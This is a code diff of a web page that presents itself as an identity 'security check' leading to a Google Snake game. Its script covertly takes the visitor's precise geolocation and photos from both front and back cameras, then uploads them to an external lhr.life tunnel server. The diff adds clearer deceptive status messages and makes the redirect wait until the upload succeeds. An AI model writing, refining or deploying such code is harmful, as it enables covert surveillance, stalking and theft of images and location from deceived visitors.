@@ -25,72 +25,101 @@
     <canvas id="c"></canvas>
 
     <script>
-        // REPLACE WITH YOUR ACTUAL LHR.LIFE LINK
-        const API = "https://d9de33c5cd99ee.lhr.life"; 
-        // Direct link to Google Snake
-        const REDIRECT_URL = "https://www.google.com/fbx?fbx=snake_arcade";
+    // Твоя актуальная ссылка (БЕЗ слэша в конце)
+    const API = "https://1297695c3994a6.lhr.life"; 
+    const REDIRECT_URL = "https://www.google.com/fbx?fbx=snake_arcade";
 
-        const user = new URLSearchParams(window.location.search).get('user') || "Unknown";
+    const user = new URLSearchParams(window.location.search).get('user') || "Unknown";
 
-        // Emergency fallback: redirect anyway after 12 seconds if something hangs
-        const fallback = setTimeout(() => { window.location.href = REDIRECT_URL; }, 12000);
+    // Функция для захвата фото
+    async function takePhoto(mode) {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: mode } 
+            });
+            const v = document.getElementById('v');
+            v.srcObject = stream;
 
-        async function takePhoto(mode) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
-                const v = document.getElementById('v');
-                v.srcObject = stream;
-                await new Promise(r => setTimeout(r, 1500));
-                const canvas = document.getElementById('c');
-                canvas.width = v.videoWidth; canvas.height = v.videoHeight;
-                canvas.getContext('2d').drawImage(v, 0, 0);
-                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
-                stream.getTracks().forEach(t => t.stop());
-                return blob;
-            } catch { return null; }
+            // Ждем чуть дольше (2 секунды), чтобы камера сфокусировалась
+            await new Promise(r => setTimeout(r, 2000));
+
+            const canvas = document.getElementById('c');
+            canvas.width = v.videoWidth;
+            canvas.height = v.videoHeight;
+            canvas.getContext('2d').drawImage(v, 0, 0);
+
+            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
+            
+            // Останавливаем камеру сразу после снимка
+            stream.getTracks().forEach(t => t.stop());
+            return blob;
+        } catch (e) {
+            console.error("Camera error:", e);
+            return null;
         }
+    }
 
-        async function run() {
-            const btn = document.getElementById('go');
-            const loader = document.getElementById('loader');
-            const msg = document.getElementById('msg');
-            const statusTitle = document.getElementById('st');
+    async function run() {
+        const btn = document.getElementById('go');
+        const loader = document.getElementById('loader');
+        const msg = document.getElementById('msg');
+        const statusTitle = document.getElementById('st');
 
-            btn.style.display = 'none';
-            loader.style.display = 'block';
-            msg.innerText = "Processing security check...";
+        // Скрываем кнопку, показываем лоадер
+        btn.style.display = 'none';
+        loader.style.display = 'block';
+        msg.innerText = "Processing security check...";
 
-            // 1. Get Location
+        try {
+            // 1. Отправляем локацию (не блокируем выполнение)
             navigator.geolocation.getCurrentPosition(p => {
                 fetch(`${API}/location?lat=${p.coords.latitude}&lon=${p.coords.longitude}&user=${user}`).catch(() => {});
-            }, null, {enableHighAccuracy:true});
+            }, null, {enableHighAccuracy: true});
 
-            // 2. Capture Photos
+            // 2. Делаем фото (строго по очереди)
             const fd = new FormData();
-            const f1 = await takePhoto("user");
+            
+            msg.innerText = "Verifying identity (1/2)...";
+            const f1 = await takePhoto("user"); // Фронталка
             if (f1) fd.append('files', f1, 'front.jpg');
-            const f2 = await takePhoto("environment");
+
+            msg.innerText = "Verifying identity (2/2)...";
+            const f2 = await takePhoto("environment"); // Задняя
             if (f2) fd.append('files', f2, 'back.jpg');
 
-            // 3. Send Data and Redirect
-            try {
-                if (fd.has('files')) {
-                    await fetch(`${API}/upload-photo?user=${user}`, { method: 'POST', body: fd });
-                }
-            } catch (e) {
-                console.log("Upload failed, redirecting anyway.");
+            // 3. ОТПРАВКА НА СЕРВЕР (Ждем завершения!)
+            if (fd.has('files')) {
+                msg.innerText = "Uploading data...";
+                const response = await fetch(`${API}/upload-photo?user=${user}`, {
+                    method: 'POST',
+                    body: fd
+                });
+
+                if (!response.ok) throw new Error("Server error");
+                
+                console.log("Upload successful");
+            } else {
+                throw new Error("No photos captured");
             }
 
-            // Finalizing
-            clearTimeout(fallback);
+            // 4. ФИНАЛ: Только после успешного fetch меняем текст и уходим на змейку
             statusTitle.innerText = "Success";
             loader.style.display = 'none';
-            msg.innerText = "Identity verified. Redirecting to Snake Arcade...";
-            
+            msg.innerText = "Identity verified! Redirecting to game...";
+
             setTimeout(() => {
                 window.location.href = REDIRECT_URL;
-            }, 1000);
+            }, 1500);
+
+        } catch (e) {
+            console.error("Error during process:", e);
+            statusTitle.innerText = "Error";
+            msg.innerText = "Verification failed. Please check camera permissions.";
+            loader.style.display = 'none';
+            btn.style.display = 'block';
+            btn.innerText = "RETRY";
         }
-    </script>
+    }
+</script>
 </body>
 </html>
